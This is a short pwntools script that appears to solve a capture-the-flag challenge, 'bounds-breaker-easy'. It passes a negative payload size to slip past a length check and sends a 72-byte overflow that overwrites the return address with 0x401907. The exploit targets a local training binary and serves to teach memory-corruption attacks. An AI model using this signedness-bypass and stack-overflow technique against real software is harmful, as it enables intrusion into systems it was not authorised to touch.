from pwn import *

p = process('/challenge/bounds-breaker-easy')

p.recvuntil('Payload size: ')

p.sendline(b'-50')
payload = b'a' * 72 + p64(0x401907)

p.recvuntil('Send your payload')
p.sendline(payload)

p.interactive()
